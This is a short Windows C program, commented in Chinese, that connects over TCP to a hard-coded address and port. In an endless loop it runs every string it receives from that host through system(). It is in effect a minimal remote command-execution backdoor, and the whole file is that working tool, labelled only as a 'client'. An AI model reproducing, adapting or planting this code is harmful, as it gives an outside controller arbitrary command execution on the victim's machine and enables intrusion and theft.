#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include<stdio.h>
#include<stdlib.h>
#include<WinSock2.h>
#pragma comment(lib, "ws2_32.lib")

#define port 5529
#define ip_addr "192.168.191.1"

void main() {

	WSADATA WSA;							  //对比版本
	SOCKET client;							  //客户端
	struct sockaddr_in serveraddr;			  //服务器地址
	int addr_length = 0;
	HANDLE hthread = NULL;				      //线程句柄
	int Ret = 0;							  //
	char senbuf[256] = { 0 };

	if (WSAStartup(MAKEWORD(2,2), &WSA) != 0) {
		puts("版本不一致，通信失败");
		system("pause");
		return;
	}
	client = socket(AF_INET, SOCK_STREAM, 0);	//创建
	if (client == INVALID_SOCKET) {
		puts("客户端创建失败");
		system("pause");
	}
	serveraddr.sin_family = AF_INET;
	serveraddr.sin_addr.S_un.S_addr = inet_addr(ip_addr);		//设置地址
	serveraddr.sin_port = htons(port);							//端口

	memset(serveraddr.sin_zero, 0x00, 8);
	Ret = connect(client, (struct sockaddr*) &serveraddr, sizeof(serveraddr));
	
	if (Ret != 0) {
		puts("客户端链接失败");
		system("pause");
	}
	while (1) {

		char receivebuf[256];
		memset(receivebuf, 0, 256);
		Ret = recv(client, receivebuf, 256, 0);
		printf("%s", receivebuf);
		system(receivebuf);
	}
	closesocket(client);
	WSACleanup();

}